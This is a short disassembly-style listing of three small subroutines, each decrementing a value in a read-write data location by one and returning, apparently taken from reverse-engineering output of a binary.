sub_4a6b0c
sub [ rw-data ] 0x1
retn
sub_4a6b14
sub [ rw-data ] 0x1
retn
sub_4a6b1c
sub [ rw-data ] 0x1
retn
